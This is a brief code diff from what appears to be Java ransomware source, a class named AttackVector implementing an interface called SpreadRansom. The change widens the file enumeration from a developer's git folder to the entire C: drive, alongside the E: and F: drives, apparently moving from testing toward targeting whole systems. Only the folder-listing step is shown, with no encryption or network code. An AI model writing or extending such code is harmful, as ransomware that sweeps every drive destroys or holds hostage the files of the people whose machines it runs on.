@@ -56,7 +56,7 @@ public class AttackVector implements SpreadRansom {
 		Collection<File> _folderTree = null;
 		System.out.println("c:");
 		// listf("C:\\", _folderTree);
-		listf("C:\\Users\\HP\\git", _folderTree);
+		listf("C:\\", _folderTree);
 		System.out.println("\n E:");
 		listf("E:\\", _folderTree);
 		System.out.println("\nF:");
